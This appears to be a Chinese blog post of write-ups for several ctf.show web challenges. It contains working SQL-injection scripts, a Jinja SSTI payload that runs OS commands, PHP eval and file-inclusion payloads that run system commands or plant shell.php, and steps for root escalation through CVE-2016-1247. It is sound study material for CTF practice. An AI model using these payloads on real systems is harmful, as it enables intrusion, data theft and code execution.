<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|&#125;~ 	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>随便传个?c&#x3D;!就行</p>
<h2 id="萌新记忆"><a href="#萌新记忆" class="headerlink" title="萌新记忆"></a>萌新记忆</h2><p>进去扫网出来个&#x2F;admin</p>
<p>sql先试探一下，password部分估计是md5，没法闭合，username单引号闭合，简单fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://dcf0879c-3bff-4175-817e-a3a631e1dfc0.challenge.ctf.show/admin/checklogin.php&quot;</span><br><span class="line">fuzz = string.printable</span><br><span class="line">sql_payload = [&quot;select&quot;, &quot;union&quot;, &quot;or&quot;, &quot;and&quot;, &quot;||&quot;, &quot;&amp;&amp;&quot;, &quot;from&quot;, &quot;where&quot;, &quot;order&quot;, &quot;group&quot;, &quot;by&quot;, &quot;having&quot;, &quot;like&quot;,</span><br><span class="line">               &quot;updatexml&quot;, &quot;order&quot;, &quot;exp&quot;, &quot;floor&quot;, &quot;rand&quot;, &quot;extractvalue&quot;, &quot;geometrycollection&quot;, &quot;multipoint&quot;,</span><br><span class="line">               &quot;polygon&quot;, &quot;multipolygon&quot;, &quot;linestring&quot;, &quot;multilinestring&quot;, &quot;sleep&quot;, &quot;length&quot;, &quot;substr&quot;, &quot;mid&quot;, &quot;ascii&quot;,</span><br><span class="line">               &quot;ord&quot;, &quot;if&quot;, &quot;/**/&quot;, &quot;//&quot;]</span><br><span class="line">for i in fuzz:</span><br><span class="line">    re = requests.post(url, data = &#123;&quot;u&quot;: i, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">    if &quot;我报警了&quot; in re.text:</span><br><span class="line">        print(i, end = &quot; &quot;)</span><br><span class="line">for sqls in sql_payload:</span><br><span class="line">    re = requests.post(url, data = &#123;&quot;u&quot;: sqls, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">    if &quot;我报警了&quot; in re.text:</span><br><span class="line">        print(sqls, end = &quot; &quot;)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! &quot; # % &amp; * + - . : ; = &gt; ? @ ] ^ _ ` &#123; &#125; ~ select union or and &amp;&amp; from where order by having like order floor rand sleep mid ascii ord if /**/</span><br></pre></td></tr></table></figure>

<p>那其实也没办法闭合了</p>
<p>可以猜测一下里边的sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where username = &#x27;$_POST[&quot;u&quot;]&#x27; and &#x27;$_POST[&quot;p&quot;]&#x27;;</span><br></pre></td></tr></table></figure>

<p>还有一个知识点是应该知道的，就是<code>在sql语句中 and级别高于or</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312061625942.png" alt="image-20231206162545901"></p>
<p>先<code>1=1 and password = &#39;t&#39;</code>进行运算，得到结果<code>1</code>，然后再<code>where realname = &#39;admin&#39; or 1</code> 得到永真</p>
<p>所以这里就可以直接插一条sub来盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">letter = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">url = &quot;http://dcf0879c-3bff-4175-817e-a3a631e1dfc0.challenge.ctf.show/admin/checklogin.php&quot;</span><br><span class="line">for times in range(1, 20):</span><br><span class="line">    for i in letter:</span><br><span class="line">        payload = &quot;&#x27;||substr(p,&#123;&#125;,1)&lt;&#x27;&#123;&#125;&quot;.format(times, i)</span><br><span class="line">        re = requests.post(url, data = &#123;&quot;u&quot;: payload, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">        if re.text == &quot;密码错误&quot;:</span><br><span class="line">            print(letter[letter.find(i) - 1], end = &quot;&quot;)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>密码打出来去掉两个ZZ登陆就行</p>
<p>抽象的是payload还不能带空格，哈哈</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>一眼丁真<a href="http://www.zip泄密,/">www.zip泄密，</a></p>
<p>拉出来代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">waf_login:</span><br><span class="line">if(preg_match(&quot;/load|and|or|\||\&amp;|select|union|\&#x27;|=| |\\\|,|sleep|ascii/i&quot;,$arr))</span><br><span class="line">waf_register:</span><br><span class="line">if(preg_match(&quot;/load|and|\||\&amp;| |\\\|sleep|ascii|if/i&quot;,$arr))</span><br><span class="line">register.php:</span><br><span class="line">if(isset($_POST[&#x27;e&#x27;])&amp;&amp;isset($_POST[&#x27;u&#x27;])&amp;&amp;isset($_POST[&#x27;p&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$e=$_POST[&#x27;e&#x27;];</span><br><span class="line">$u=$_POST[&#x27;u&#x27;];</span><br><span class="line">$p=$_POST[&#x27;p&#x27;];</span><br><span class="line">$sql =</span><br><span class="line">&quot;insert into test1</span><br><span class="line">set email = &#x27;$e&#x27;, </span><br><span class="line">username = &#x27;$u&#x27;,</span><br><span class="line">password = &#x27;$p&#x27;</span><br><span class="line">&quot;;</span><br><span class="line">user.php</span><br><span class="line">if (is_numeric($username))</span><br><span class="line">	&#123;	</span><br><span class="line">		if(strlen($username)&gt;10) &#123;</span><br><span class="line">			$username=substr($username,0,10);</span><br><span class="line">		&#125;</span><br><span class="line">		echo &quot;Hello $username,there&#x27;s nothing here but dog food!&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到要求：</p>
<ul>
<li>username部分必须是数字</li>
<li>在注册功能的waf是明显少很多的</li>
</ul>
<p>登陆成功之后，如果username是纯数字，则会直接输出username的值出来</p>
<p>所以可以构造username&#x3D;select(flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)，如果要让他变成纯数字并且ascii被ban的情况下，可以使用两层hex函数，第一步将原文转化为16进制，由于16进制含ABCDEF，再套一层可以保证全是数字</p>
<p>所以要考虑如何逃逸出<code>username = &#39;$u&#39;</code></p>
<p>简单在$e中多拼接一个<code>&#39;</code>，后面跟上payload</p>
<p>但是由于换行的限制，在$e中传入的payload处在同行，所以需要用&#x2F;**&#x2F;的操作来注释多行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果不使用/**/，仅用#是无法将换行后的username和password注释掉的</span><br><span class="line">insert into test1</span><br><span class="line">set email = &#x27;1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),password/**/=/**/&#x27;pass&#x27;#&#x27;, </span><br><span class="line">username = &#x27;user&#x27;,</span><br><span class="line">password = &#x27;pass&#x27;</span><br><span class="line">成功的打法</span><br><span class="line">insert into test1</span><br><span class="line">set email = &#x27;1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),/*&#x27;, </span><br><span class="line">username = &#x27;user*/#&#x27;,</span><br><span class="line">password = &#x27;pass&#x27;</span><br></pre></td></tr></table></figure>

<p>这样的打法就成功将第三行的username注释掉了，再使用一个#注释后面的<code>&#39;#</code></p>
<p>所以一个poc就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),/*</span><br><span class="line">&amp;u=*/#</span><br><span class="line">&amp;p=pass</span><br></pre></td></tr></table></figure>

<p>给出一个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url1 = &quot;http://7bc05111-4ec7-4214-81c9-4e8e0c259385.challenge.ctf.show/register.php&quot;</span><br><span class="line">url2 = &quot;http://7bc05111-4ec7-4214-81c9-4e8e0c259385.challenge.ctf.show/login.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    payload = &quot;hex(hex(substr((select/**/flag/**/from/**/flag),&#123;&#125;,1)))&quot;.format(i)</span><br><span class="line">    print(payload)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        &quot;e&quot;: str(i) + &quot;&#x27;,username=&quot; + payload + &quot;,/*&quot;,</span><br><span class="line">        &quot;u&quot;: &quot;*/#&quot;,</span><br><span class="line">        &quot;p&quot;: i</span><br><span class="line">    &#125;</span><br><span class="line">    r1 = s.post(url1, data = data1)</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        &quot;e&quot;: str(i),</span><br><span class="line">        &quot;p&quot;: i</span><br><span class="line">    &#125;</span><br><span class="line">    r2 = s.post(url2, data = data2)</span><br><span class="line">    t = r2.text</span><br><span class="line">    real = re.findall(&quot;Hello (.*?),&quot;, t)[0]</span><br><span class="line">    flag += real</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p>得到flag的双重hex转string即可</p>
<h2 id="出题人不想跟你说话-jpg"><a href="#出题人不想跟你说话-jpg" class="headerlink" title="出题人不想跟你说话.jpg"></a>出题人不想跟你说话.jpg</h2><p>变成提权了</p>
<p>进去一张图，提示cai和菜刀</p>
<p>直接蚁剑连上去，密码cai</p>
<p>但是进去的用户是www-data，需要考虑提权</p>
<p>hint提示去看看什么服务</p>
<p>直接<code>cat /etc/crontab</code>看看有什么服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101912715.png" alt="image-20231210191207659"></p>
<p>每分钟执行一次<code>/usr/sbin/logrotate -vf /etc/logrotate.d/nginx</code></p>
<p>蚁剑的终端太傻逼了，反弹个shell到攻击机上</p>
<p>已经提示是nginx服务+提权了，直接有<a href="https://www.exploit-db.com/exploits/40768">CVE-2016-1247</a></p>
<p>exp搞下来执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 ./nginx.sh</span><br><span class="line">./nginx.sh /var/log/nginx/error.log</span><br></pre></td></tr></table></figure>

<p>等待一分钟crontab自动执行后提权</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101915632.png" alt="image-20231210191545599"></p>
<h2 id="蓝瘦"><a href="#蓝瘦" class="headerlink" title="蓝瘦"></a>蓝瘦</h2><p>看一眼session一眼flask session伪造</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101928773.png" alt="image-20231210192814717"></p>
<p>F12给key: ican，直接伪造</p>
<p>打进去提示<code>缺少请求参数！</code></p>
<p>首页还有个param: ctfshow，传个值进去回显</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101941359.png" alt="image-20231210194113312"></p>
<p>ssti直接梭，0过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if&#x27;war&#x27;in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一览无余"><a href="#一览无余" class="headerlink" title="一览无余"></a>一览无余</h2><p>CVE-2019-11043</p>
<p>特点nginx&#x2F;1.20.1</p>
<p>拿phuip-fpizdam直接打</p>
<h2 id="登陆就有flag"><a href="#登陆就有flag" class="headerlink" title="登陆就有flag"></a>登陆就有flag</h2><p>考察的点是mysql的隐式类型转换</p>
<p>当输入<code>&#39;3&#39;-&#39;1&#39;</code>时，mysql引擎会把<code>&#39;&#39;</code>包含的当做数字进行减法运算</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202401272232185.png" alt="image-20240127223155075"></p>
<p>fuzz之后可用的特殊字符串有<code>!#$&amp;&#39;./:&lt;&gt;?@[]^_&#123;&#125;</code></p>
<p>显然，可以用&amp; ^来进行操作</p>
<p><code>select &#39;&#39;^&#39;&#39;</code>和<code>select &#39;&#39;&amp;&#39;&#39;</code>的结果均为0，而sql的select语句又有个特点，指定<code>where=0</code>时，会查询所有非数字开头的记录</p>
<p>所以就直接打一个<code>select * from flag where u=&#39;&#39;^&#39;&#39;#</code>的payload即可</p>
<p>市赛海燕那个也能这么打<code>&#39;*&#39;</code></p>
<h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php ($S = $_GET[&#x27;S&#x27;])?eval(&quot;$$S&quot;):highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>eval中可利用<code>;</code>进行多php语句操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=a;system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p>预期解是变量覆盖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=S=system(&#x27;cat ../flag.txt&#x27;);</span><br><span class="line">或者</span><br><span class="line">?S=a=system(&#x27;cat ../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>也有这种打法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=_POST[&#x27;1&#x27;]($_POST[&#x27;2&#x27;]);</span><br><span class="line">1=system&amp;2=ls</span><br></pre></td></tr></table></figure>

<h2 id="不知所措-jpg"><a href="#不知所措-jpg" class="headerlink" title="不知所措.jpg"></a>不知所措.jpg</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file must has test</span><br></pre></td></tr></table></figure>

<p>必须带test字眼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=test.</span><br></pre></td></tr></table></figure>

<p>打过去提示flag not here，估计是一层文件包含</p>
<p>伪协议直接打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=test.</span><br></pre></td></tr></table></figure>

<p>这里有一个tips</p>
<blockquote>
<h4 id="php-x2F-x2F-filter-¶"><a href="#php-x2F-x2F-filter-¶" class="headerlink" title="php:&#x2F;&#x2F;filter ¶"></a>php:&#x2F;&#x2F;filter<a href="https://www.php.net/manual/zh/wrappers.php.php#wrappers.php.filter"> ¶</a></h4><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>、 <a href="https://www.php.net/manual/zh/function.file.php">file()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>php:&#x2F;&#x2F;filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>
<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
</tr>
<tr>
<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
</tr>
<tr>
<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
</blockquote>
<p>在read和resource中间可以任意插入，不影响数据的读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/test/resource=test.</span><br></pre></td></tr></table></figure>

<p>在这里加入test后不影响</p>
<p>所以可以通过这个来读index</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/test/resource=index.</span><br></pre></td></tr></table></figure>

<p>打出来确实是include，那就直接data打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);echo &#x27;test&#x27;; ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><p>进入让传个username和password，cookie还带了hash，合理猜测这三个相关</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5($secret.$name)===$pass</span><br></pre></td></tr></table></figure>

<p>传username&#x3D;1，password&#x3D;hash，发现通过<code>window.location.href</code>自动跳转了两个页面：flflflflag.php，404.html</p>
<p>进burp一步步看，在flflflflag中提示了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include($_GET[&quot;file&quot;])</span><br></pre></td></tr></table></figure>

<p>既然都include，直接php伪协议把源码读出来</p>
<p>flflflflag.php:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">    die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>也就这里的文件包含能利用了</p>
<h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><p>有个知识点：</p>
<blockquote>
<p>PHP可以通过POST或者PUT进行文件上传，上传的文件存在临时文件的存储目录中，在一个正常存活周期后删除</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202401300030285.png" alt="临时文件正常的存货周期"></p>
<p>上面这张图是PHP在通过POST方法上传文件时的运行周期图，可以看到我们临时文件的存活周期就是上图红色框中的时间段。另外，如果在php运行的过程中，假如php非正常结束，比如崩溃，那么这个临时文件就会永久的保留。如果php正常的结束，并且该文件没有被移动到其它地方也没有被改名，则该文件将在表单请求结束时被删除。</p>
<p>根据@王一航师傅去年的一个发现，利用<strong>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</strong>造成崩溃。在含有文件包含漏洞的地方，使用<strong>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</strong>导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录</p>
</blockquote>
<p>经过文件扫描后还发现了个dir.php，里面就是var_dump了&#x2F;tmp的目录</p>
<p>那就可以猜测tmp目录就是&#x2F;tmp下</p>
<p>给一个python的文件上传脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload_file_to_url(url, file_content, file_name):</span><br><span class="line">    file_data = io.BytesIO(file_content.encode())</span><br><span class="line"></span><br><span class="line">    files = &#123;&#x27;file&#x27;: (file_name, file_data)&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, files=files)</span><br><span class="line"></span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line">target_url = &#x27;http://43f8f4c1-7229-4348-8c40-e5858b937637.challenge.ctf.show/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span><br><span class="line">content_to_upload = &#x27;&lt;?php file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php phpinfo();?&gt;&quot;)?&gt;&#x27;</span><br><span class="line">file_name_to_upload = &#x27;test&#x27;</span><br><span class="line"></span><br><span class="line">upload_file_to_url(target_url, content_to_upload, file_name_to_upload)</span><br></pre></td></tr></table></figure>

<p>里面使用<code>php://filter/string.strip_tags</code>来造成崩溃，再访问dir.php即可找到该文件的名字</p>
<p>这个文件被包含的结果就是，创建一个shell.php，往里面写入<code>&lt;?php phpinfo();?&gt;</code></p>
<p>include包含之后直接访问shell.php</p>
<h3 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h3><p>参考：</p>
<p><a href="https://xz.aliyun.com/t/9545">浅谈 SESSION_UPLOAD_PROGRESS 的利用</a></p>
<p><a href="https://www.anquanke.com/post/id/201177">LFI 绕过 Session 包含限制 Getshell</a></p>
<blockquote>
<p>Session Upload Progress 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中，此时即使用户没有初始化Session，PHP也会自动初始化Session。而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。</p>
</blockquote>
<p>思路是一样的，包含一个恶意文件，只不过这个恶意文件由session upload得来</p>
<h2 id="给你shell"><a href="#给你shell" class="headerlink" title="给你shell"></a>给你shell</h2><p>F12提示传参<code>?view_source</code>，进去显示源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;view_source&#x27;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function checkCookie($s) &#123;</span><br><span class="line">    $arr = explode(&#x27;:&#x27;, $s);</span><br><span class="line">    if ($arr[0] === &#x27;&#123;&quot;secret&quot;&#x27; &amp;&amp; preg_match(&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;, $arr[1]) &amp;&amp; count($arr) === 2 ) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( !theFirstTimeSetCookie() ) setcookie(&#x27;secret&#x27;, &#x27;&#x27;, time()-1);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function haveFun($_f_g) &#123;</span><br><span class="line">    $_g_r = 32;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    for ($i = 0; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, 1);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; 0xC0);</span><br><span class="line">    &#125;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isset($_COOKIE[&#x27;secret&#x27;]) ? $json = $_COOKIE[&#x27;secret&#x27;] : setcookie(&#x27;secret&#x27;, &#x27;&#123;&quot;secret&quot;:&quot;&#x27; . strtoupper(md5(&#x27;y1ng&#x27;)) . &#x27;&quot;&#125;&#x27;, time()+7200 );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, true) : die(&#x27;no&#x27;);</span><br><span class="line"></span><br><span class="line">if ($obj &amp;&amp; isset($_GET[&#x27;give_me_shell&#x27;])) &#123;</span><br><span class="line">    ($obj[&#x27;secret&#x27;] != $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">die;</span><br></pre></td></tr></table></figure>

<p>处理流程：如果cookie中设置了secret，赋值给$json，否则给你加上个md5(‘y1ng’)作为cookie</p>
<p>正常情况下cookie的secret为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret=%7B%22secret%22%3A%22770F0F8B605CFD2BA494849D948D34EF%22%7D</span><br><span class="line">urldecode-&gt;</span><br><span class="line">secret=&#123;&quot;secret&quot;:&quot;770F0F8B605CFD2BA494849D948D34EF&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>进入checkCookie函数，要求$json<code>:</code>前为<code>&#123;&quot;secret&quot;</code>，后半部分<code>[\&quot;0-9A-Z]*</code>且以<code>&#125;</code>结尾</p>
<p>往后就是$obj接收$json经过json_decode的内容</p>
<p>如果$obj[‘secret’]！&#x3D;$flag_md5，就进haveFun函数，里面就是把flag md5后转大写，然后每位都和0xC0异或</p>
<p>测试出来haveFun的输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0006464640064064646464006406464064640064006400000000000</span><br></pre></td></tr></table></figure>

<p>再试试会发现输出有规律：数字-&gt;0，字母-&gt;64</p>
<p>所以flag md5后的前三个一定是数字</p>
<p>利用php弱比较，数字和数字开头的str比较，str会自动截取，让str转为数字再比较</p>
<p>让<code>secret=&#123;&quot;secret&quot;:123&#125;</code>，其中123会被json_decode解析为数字，在这里爆破得到115</p>
<p>进下一步path</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">require &quot;hidden_filter.php&quot;;</span><br><span class="line"></span><br><span class="line">if (!$_SESSION[&#x27;login&#x27;])</span><br><span class="line">    die(&#x27;&lt;script&gt;location.href=\&#x27;./index.php\&#x27;&lt;/script&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        //清空session 从头再来</span><br><span class="line">        eval(&quot;\$_SESSION[&quot; . $code . &quot;]=false;&quot;); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span><br><span class="line">    &#125; else die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fuzz一通被ban了&#96;&#96;fF”$’()*+&#x2F;;^|&#96;</p>
<p>直接php短标签提前闭合，造成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;\$_SESSION[1]?&gt;&lt;?=?&gt;]=false;&quot;);</span><br></pre></td></tr></table></figure>

<p>接下来要考虑怎么样在新开的标签里读到flag.txt，而且F,f都被ban了，括号也ban了，基本调用不到函数</p>
<p>可以用require来包含(include被ban)，加上个~取反来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo urlencode(~&quot;/flag.txt&quot;)-&gt;%d0%99%93%9e%98%d1%8b%87%8b</span><br><span class="line">echo urlencode(~&quot;/flag&quot;)-&gt;%d0%99%93%9e%98</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1]?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="RemoteImageDownloader"><a href="#RemoteImageDownloader" class="headerlink" title="RemoteImageDownloader"></a>RemoteImageDownloader</h2><p>一眼过去觉得是php+curl，想着file协议直接拿下了</p>
<p>但是测试了发现并不是php，起一个HTTP HEARDER ECHO服务看看UA头得到后端的请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    from http.server import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">except:</span><br><span class="line">    from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">from optparse import OptionParser</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">class RequestHandler(BaseHTTPRequestHandler):</span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        request_path = self.path</span><br><span class="line"></span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&#x27;Content-Type&#x27;, &#x27;application/json&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        json_string = json.dumps(dict(self.headers))</span><br><span class="line">        self.wfile.write(json_string.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">        print(&#x27;%sBegin of Headers%s&#x27; % (&#x27;-&#x27; * 5, &#x27;-&#x27; * 5))</span><br><span class="line">        for k, v in self.headers.items():</span><br><span class="line">            print(&#x27;%s: %s&#x27; % (k, v))</span><br><span class="line">        print(&#x27;%sEnd of Headers%s&#x27; % (&#x27;-&#x27; * 5, &#x27;-&#x27; * 5))</span><br><span class="line"></span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    do_POST   = do_GET</span><br><span class="line">    do_PUT    = do_GET</span><br><span class="line">    do_DELETE = do_GET</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    port = 8080</span><br><span class="line">    print(&#x27;Listening on all interfaces:%s&#x27; % port)</span><br><span class="line">    server = HTTPServer((&#x27;&#x27;, port), RequestHandler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.usage = (&quot;Creates an HTTP-header-echo-server.&quot;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402042314535.png" alt="image-20240204231410411"></p>
<p>PhantomJS2.1.1有<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17221">CVE-2019-17221</a></p>
